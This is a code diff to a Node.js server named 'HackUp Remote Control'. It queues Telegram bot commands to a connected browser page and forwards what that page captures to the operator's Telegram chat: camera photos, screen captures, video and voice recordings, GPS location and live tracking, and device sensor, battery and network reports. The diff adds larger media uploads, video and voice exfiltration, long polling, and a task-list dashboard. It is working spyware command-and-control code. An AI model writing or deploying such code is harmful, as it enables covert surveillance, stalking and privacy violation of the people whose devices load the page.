@@ -8,28 +8,35 @@ const app = express();
 const PORT = process.env.PORT || 3000;
 const BOT_TOKEN = process.env.BOT_TOKEN;
 const CHAT_ID = process.env.CHAT_ID;
+const USE_POLLING = process.env.USE_POLLING !== 'false';
+const IS_VERCEL = !!process.env.VERCEL;
 
 app.use(cors());
-app.use(express.json({ limit: '5mb' }));
-app.use(express.urlencoded({ extended: true, limit: '5mb' }));
+app.use(express.json({ limit: '25mb' }));
+app.use(express.urlencoded({ extended: true, limit: '25mb' }));
 app.use(express.static(path.join(__dirname, 'public')));
 
-// ---------- state ----------
-const cmdQueue = [];        // Telegram → Browser commands
-const cmdResults = {};      // Browser → Server results
+// ---------- In-memory state ----------
+const cmdQueue = [];
+const cmdResults = {};
 let lastBrowserPing = 0;
 const logs = [];
+const tasks = [];
+const activity = [];
 
 const tgReady = () => Boolean(BOT_TOKEN && CHAT_ID);
 const tgUrl = (m) => `https://api.telegram.org/bot${BOT_TOKEN}/${m}`;
-const TG_TIMEOUT = 8000;
+const TG_TIMEOUT = 20000;
 
-// ---------- helpers ----------
 function log(msg) {
   const e = { msg, ts: new Date().toISOString() };
   logs.unshift(e);
-  if (logs.length > 100) logs.pop();
+  if (logs.length > 200) logs.pop();
   console.log('[HackUp]', msg);
+}
+function addActivity(action) {
+  activity.unshift({ action, timestamp: Date.now() });
+  if (activity.length > 100) activity.pop();
 }
 
 async function tgSend(text) {
@@ -43,30 +50,39 @@ async function tgSend(text) {
   return r.data;
 }
 
-async function tgSendPhoto(dataUrl, caption) {
+async function tgSendMedia(dataUrl, caption, kind) {
   if (!tgReady()) throw new Error('Telegram credentials missing');
   const m = /^data:([^;]+);base64,(.+)$/.exec(dataUrl || '');
-  if (!m) throw new Error('Invalid image');
+  if (!m) throw new Error('Invalid data URL');
   const mime = m[1];
   const buf = Buffer.from(m[2], 'base64');
-  if (buf.length > 4.5 * 1024 * 1024) throw new Error('Image >4.5MB');
+  if (buf.length > 50 * 1024 * 1024) throw new Error('Media >50MB');
+
+  const map = {
+    photo:    { method: 'sendPhoto',    field: 'photo',    file: 'capture.jpg' },
+    video:    { method: 'sendVideo',    field: 'video',    file: 'capture.webm' },
+    voice:    { method: 'sendVoice',    field: 'voice',    file: 'voice.webm' },
+    audio:    { method: 'sendAudio',    field: 'audio',    file: 'audio.webm' },
+    document: { method: 'sendDocument', field: 'document', file: 'file.bin' }
+  };
+  const k = map[kind] || map.photo;
 
   const boundary = '----hackup' + Date.now();
   const parts = [];
   const push = s => parts.push(Buffer.from(s, 'utf8'));
   push(`--${boundary}\r\nContent-Disposition: form-data; name="chat_id"\r\n\r\n${CHAT_ID}\r\n`);
-  push(`--${boundary}\r\nContent-Disposition: form-data; name="caption"\r\n\r\n${(caption || '📸 Capture').slice(0,1000)}\r\n`);
-  push(`--${boundary}\r\nContent-Disposition: form-data; name="photo"; filename="capture.jpg"\r\nContent-Type: ${mime}\r\n\r\n`);
+  if (caption) push(`--${boundary}\r\nContent-Disposition: form-data; name="caption"\r\n\r\n${String(caption).slice(0,1000)}\r\n`);
+  push(`--${boundary}\r\nContent-Disposition: form-data; name="${k.field}"; filename="${k.file}"\r\nContent-Type: ${mime}\r\n\r\n`);
   parts.push(buf);
   push(`\r\n--${boundary}--\r\n`);
   const body = Buffer.concat(parts);
 
-  const r = await axios.post(tgUrl('sendPhoto'), body, {
+  const r = await axios.post(tgUrl(k.method), body, {
     headers: {
       'Content-Type': `multipart/form-data; boundary=${boundary}`,
       'Content-Length': body.length
     },
-    timeout: TG_TIMEOUT, maxBodyLength: Infinity, maxContentLength: Infinity
+    timeout: 90000, maxBodyLength: Infinity, maxContentLength: Infinity
   });
   return r.data;
 }
@@ -79,40 +95,99 @@ async function tgSendLocation(lat, lon) {
   return r.data;
 }
 
-// ---------- routes ----------
-app.get('/api/health', (_, res) => {
-  res.json({
-    ok: true,
-    telegramConfigured: tgReady(),
-    browserOnline: Date.now() - lastBrowserPing < 20000,
-    queued: cmdQueue.length,
-    uptime: process.uptime()
-  });
-});
+// ---------- Command handling ----------
+const SIMPLE_COMMANDS = {
+  '/photo': () => ({ type: 'photo' }),
+  '/screen': () => ({ type: 'screen' }),
+  '/record3': () => ({ type: 'record3' }),
+  '/record5': () => ({ type: 'record5' }),
+  '/location': () => ({ type: 'location' }),
+  '/track': () => ({ type: 'track' }),
+  '/report': () => ({ type: 'report' }),
+  '/battery': () => ({ type: 'battery' }),
+  '/network': () => ({ type: 'network' }),
+  '/sensors': () => ({ type: 'sensors' }),
+  '/storage': () => ({ type: 'storage' }),
+  '/vibrate': () => ({ type: 'vibrate' }),
+  '/fullscreen': () => ({ type: 'fullscreen' })
+};
 
-// Browser → server: receive command results + optionally forward to TG
+function queueCommand(cmd) {
+  const id = Date.now().toString(36) + Math.random().toString(36).slice(2, 6);
+  cmdQueue.push({ id, cmd, ts: Date.now() });
+  log(`Queued: ${JSON.stringify(cmd)}`);
+  return id;
+}
+
+async function handleTelegramUpdate(update) {
+  const msg = update.message || update.edited_message;
+  if (!msg || !msg.text) return;
+  const text = msg.text.trim();
+  const fromId = String(msg.chat.id);
+  if (CHAT_ID && fromId !== String(CHAT_ID)) return;
+
+  if (text === '/start' || text === '/help') {
+    await tgSend(
+      '🤖 <b>HackUp Remote Control</b>\n' +
+      '━━━━━━━━━━━━━━━━━━━━\n' +
+      '📷 /photo · 🖥️ /screen · 🎥 /record3 · 🎙️ /record5\n' +
+      '📍 /location · 🛰️ /track\n' +
+      '📊 /report · 🔋 /battery · 📶 /network · 🎯 /sensors · 💾 /storage\n' +
+      '📳 /vibrate · ⛶ /fullscreen\n' +
+      '🔊 /say &lt;text&gt; · 🔗 /open &lt;url&gt; · 🔔 /notify &lt;msg&gt;\n' +
+      '📡 /status · 📜 /logs'
+    );
+    return;
+  }
+  if (text === '/status') {
+    const alive = Date.now() - lastBrowserPing < 20000;
+    await tgSend(`📡 Browser: ${alive ? '🟢 Online' : '🔴 Offline (WebApp খুলুন)'}\nQueue: ${cmdQueue.length}`);
+    return;
+  }
+  if (text === '/logs') {
+    const recent = logs.slice(0, 10).map(l => `• ${l.msg}`).join('\n') || 'None';
+    await tgSend(`<b>Logs:</b>\n${recent}`);
+    return;
+  }
+  if (SIMPLE_COMMANDS[text]) {
+    queueCommand(SIMPLE_COMMANDS[text]());
+    await tgSend(`✅ Queued <b>${text}</b>`);
+    return;
+  }
+  if (text.startsWith('/say '))    { queueCommand({ type: 'say',    text: text.slice(5) });   await tgSend('✅ Queued /say'); return; }
+  if (text.startsWith('/open '))   { queueCommand({ type: 'open',   url: text.slice(6) });    await tgSend('✅ Queued /open'); return; }
+  if (text.startsWith('/notify ')) { queueCommand({ type: 'notify', text: text.slice(8) });   await tgSend('✅ Queued /notify'); return; }
+
+  await tgSend(`❓ Unknown: ${text}\n/help দিন।`);
+}
+
+// ---------- API Routes ----------
+app.get('/api/health', (_, res) => res.json({
+  ok: true,
+  telegramConfigured: tgReady(),
+  browserOnline: Date.now() - lastBrowserPing < 20000,
+  queued: cmdQueue.length,
+  uptime: process.uptime()
+}));
+
 app.post('/api/commands/result', async (req, res) => {
   const { id, result, forward } = req.body || {};
   if (id) cmdResults[id] = { result, ts: Date.now() };
-  if (forward && result) {
-    try { await tgSend(result); } catch {}
-  }
+  if (forward && result) { try { await tgSend(result); } catch {} }
   res.json({ ok: true });
 });
 
-// Browser → server: poll for commands
 app.get('/api/commands/poll', (_, res) => {
   lastBrowserPing = Date.now();
   const cmds = cmdQueue.splice(0, cmdQueue.length);
   res.json({ commands: cmds, ok: true });
 });
 
-// Browser → server: upload photo
 app.post('/api/upload', async (req, res) => {
   try {
-    const { image, caption } = req.body || {};
+    const { image, caption, kind } = req.body || {};
     if (!image) return res.status(400).json({ error: 'image required' });
-    const r = await tgSendPhoto(image, caption);
+    const r = await tgSendMedia(image, caption || '📸 Capture', kind || 'photo');
     res.json({ success: r.ok === true });
   } catch (e) {
     console.error('upload', e.message);
@@ -120,7 +195,6 @@ app.post('/api/upload', async (req, res) => {
   }
 });
 
-// Browser → server: location
 app.post('/api/telegram/location', async (req, res) => {
   try {
     const { latitude, longitude, caption } = req.body || {};
@@ -135,22 +209,16 @@ app.post('/api/telegram/location', async (req, res) => {
     );
     await tgSendLocation(latitude, longitude);
     res.json({ success: true });
-  } catch (e) {
-    res.status(500).json({ error: e.message });
-  }
+  } catch (e) { res.status(500).json({ error: e.message }); }
 });
 
-// Browser → server: text message
 app.post('/api/telegram/message', async (req, res) => {
   try {
     const r = await tgSend(req.body.text || '');
     res.json({ success: r.ok === true });
-  } catch (e) {
-    res.status(500).json({ error: e.message });
-  }
+  } catch (e) { res.status(500).json({ error: e.message }); }
 });
 
-// Browser → server: report (key-value)
 app.post('/api/telegram/report', async (req, res) => {
   try {
     const d = req.body || {};
@@ -163,105 +231,62 @@ app.post('/api/telegram/report', async (req, res) => {
     });
     const r = await tgSend(lines.join('\n'));
     res.json({ success: r.ok === true });
-  } catch (e) {
-    res.status(500).json({ error: e.message });
-  }
+  } catch (e) { res.status(500).json({ error: e.message }); }
 });
 
-// ---------- Telegram webhook ----------
+app.post('/api/telegram/test', async (_, res) => {
+  try { await tgSend('✅ HackUp test message'); res.json({ success: true }); }
+  catch (e) { res.status(500).json({ error: e.message }); }
+});
+
+app.post('/api/send-all', async (_, res) => {
+  try { const r = await tgSend('📤 HackUp send-all test'); res.json({ success: r.ok === true }); }
+  catch (e) { res.status(500).json({ error: e.message }); }
+});
+
+// Tasks (dashboard)
+app.get('/api/tasks', (_, res) => res.json(tasks));
+app.post('/api/tasks', (req, res) => {
+  const { title } = req.body || {};
+  if (!title) return res.status(400).json({ error: 'title required' });
+  const task = { id: Date.now().toString(36), title, completed: false };
+  tasks.push(task);
+  addActivity(`Task created: ${title}`);
+  res.json(task);
+});
+app.put('/api/tasks/:id', (req, res) => {
+  const t = tasks.find(x => x.id === req.params.id);
+  if (!t) return res.status(404).json({ error: 'not found' });
+  if (typeof req.body.completed === 'boolean') t.completed = req.body.completed;
+  if (typeof req.body.title === 'string') t.title = req.body.title;
+  addActivity(`Task updated: ${t.title}`);
+  res.json(t);
+});
+app.delete('/api/tasks/:id', (req, res) => {
+  const i = tasks.findIndex(x => x.id === req.params.id);
+  if (i < 0) return res.status(404).json({ error: 'not found' });
+  const [t] = tasks.splice(i, 1);
+  addActivity(`Task deleted: ${t.title}`);
+  res.json({ ok: true });
+});
+app.get('/api/activity', (_, res) => res.json(activity));
+
+// Webhook (optional path)
 app.post('/api/telegram/webhook', async (req, res) => {
-  try {
-    const msg = req.body?.message;
-    if (!msg || !msg.text) return res.json({ ok: true });
-    const text = msg.text.trim();
-    const fromId = String(msg.chat.id);
-    if (CHAT_ID && fromId !== String(CHAT_ID)) return res.json({ ok: true });
-
-    const queue = (cmd) => {
-      const id = Date.now().toString(36) + Math.random().toString(36).slice(2,6);
-      cmdQueue.push({ id, cmd, ts: Date.now() });
-      log(`Queued: ${JSON.stringify(cmd)}`);
-      return id;
-    };
-
-    if (text === '/start' || text === '/help') {
-      await tgSend(
-        '🤖 <b>HackUp Remote Control</b>\n' +
-        '━━━━━━━━━━━━━━━━━━━━━━\n' +
-        '📷 <b>Camera:</b>\n' +
-        '/photo — Take photo\n' +
-        '/screen — Screen capture\n' +
-        '/record3 — 3s video\n' +
-        '/record5 — 5s voice\n\n' +
-        '📍 <b>Location:</b>\n' +
-        '/location — GPS location\n' +
-        '/track — 30s live track\n\n' +
-        '📊 <b>Device Info:</b>\n' +
-        '/report — Full device report\n' +
-        '/battery — Battery status\n' +
-        '/network — Network info\n' +
-        '/sensors — Orientation/motion\n' +
-        '/storage — Storage quota\n\n' +
-        '🎮 <b>Control:</b>\n' +
-        '/vibrate — Vibrate device\n' +
-        '/say &lt;text&gt; — Speak text\n' +
-        '/open &lt;url&gt; — Open URL\n' +
-        '/fullscreen — Fullscreen\n' +
-        '/notify &lt;msg&gt; — Show notification\n\n' +
-        '🔄 <b>Status:</b>\n' +
-        '/status — Browser online?\n' +
-        '/logs — Server logs'
-      );
-    }
-    else if (text === '/status') {
-      const alive = Date.now() - lastBrowserPing < 20000;
-      await tgSend(`📡 Browser: ${alive ? '🟢 Online' : '🔴 Offline (browser খুলুন)'}\nQueue: ${cmdQueue.length}`);
-    }
-    else if (text === '/logs') {
-      const recent = logs.slice(0, 10).map(l => `• ${l.msg}`).join('\n') || 'None';
-      await tgSend(`<b>Logs:</b>\n${recent}`);
-    }
-    else if (text === '/photo') queue({ type: 'photo' });
-    else if (text === '/screen') queue({ type: 'screen' });
-    else if (text === '/record3') queue({ type: 'record3' });
-    else if (text === '/record5') queue({ type: 'record5' });
-    else if (text === '/location') queue({ type: 'location' });
-    else if (text === '/track') queue({ type: 'track' });
-    else if (text === '/report') queue({ type: 'report' });
-    else if (text === '/battery') queue({ type: 'battery' });
-    else if (text === '/network') queue({ type: 'network' });
-    else if (text === '/sensors') queue({ type: 'sensors' });
-    else if (text === '/storage') queue({ type: 'storage' });
-    else if (text === '/vibrate') queue({ type: 'vibrate' });
-    else if (text === '/fullscreen') queue({ type: 'fullscreen' });
-    else if (text.startsWith('/say ')) queue({ type: 'say', text: text.slice(5) });
-    else if (text.startsWith('/open ')) queue({ type: 'open', url: text.slice(6) });
-    else if (text.startsWith('/notify ')) queue({ type: 'notify', text: text.slice(8) });
-    else await tgSend(`❓ Unknown: ${text}\n/help দিন।`);
-
-    // কমান্ড queue-তে গেলে confirmation
-    const known = ['/photo','/screen','/record3','/record5','/location','/track','/report','/battery','/network','/sensors','/storage','/vibrate','/fullscreen'];
-    if (known.includes(text) || text.startsWith('/say ') || text.startsWith('/open ') || text.startsWith('/notify ')) {
-      await tgSend(`✅ Command queued: <b>${text}</b>\nBrowser আগামী কয়েক সেকেন্ডে execute করবে...`);
-    }
-    res.json({ ok: true });
-  } catch (e) {
-    res.status(500).json({ error: e.message });
-  }
+  try { await handleTelegramUpdate(req.body); res.json({ ok: true }); }
+  catch (e) { res.status(500).json({ error: e.message }); }
 });
 
-// ---------- webhook setup ----------
 app.get('/api/telegram/set-webhook', async (req, res) => {
   try {
     const host = req.query.url || `https://${req.headers.host}`;
     const wh = `${host}/api/telegram/webhook`;
-    const r = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/setWebhook`,
+    const r = await axios.post(tgUrl('setWebhook'),
       { url: wh, drop_pending_updates: true }, { timeout: TG_TIMEOUT });
     res.json({ success: true, webhook: wh, telegram: r.data });
   } catch (e) { res.status(500).json({ error: e.message }); }
 });
 
-// ---------- pages ----------
 app.get('*', (_, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));
 
 app.use((err, req, res, next) => {
@@ -269,7 +294,40 @@ app.use((err, req, res, next) => {
   res.status(500).json({ error: err.message || 'Server error' });
 });
 
-if (require.main === module && !process.env.VERCEL) {
-  app.listen(PORT, () => console.log(`🚀 HackUp → http://localhost:${PORT}`));
+// ---------- Telegram Long Polling (works on persistent hosts) ----------
+let polling = false;
+let lastUpdateId = 0;
+async function startTelegramPolling() {
+  if (polling || !BOT_TOKEN) return;
+  polling = true;
+  try {
+    await axios.post(tgUrl('deleteWebhook'), { drop_pending_updates: false }, { timeout: TG_TIMEOUT });
+    log('Webhook cleared → long-polling ON');
+  } catch (e) { log('deleteWebhook failed: ' + e.message); }
+
+  while (polling) {
+    try {
+      const r = await axios.get(tgUrl('getUpdates'), {
+        params: { offset: lastUpdateId + 1, timeout: 25, allowed_updates: ['message', 'edited_message'] },
+        timeout: 35000
+      });
+      const updates = (r.data && r.data.result) || [];
+      for (const u of updates) {
+        lastUpdateId = u.update_id;
+        try { await handleTelegramUpdate(u); }
+        catch (e) { log('handle error: ' + e.message); }
+      }
+    } catch (e) {
+      log('Poll error: ' + e.message);
+      await new Promise(r => setTimeout(r, 3000));
+    }
+  }
+}
+
+if (require.main === module && !IS_VERCEL) {
+  app.listen(PORT, () => {
+    console.log(`🚀 HackUp → http://localhost:${PORT}`);
+    if (USE_POLLING) startTelegramPolling();
+  });
 }
 module.exports = app;
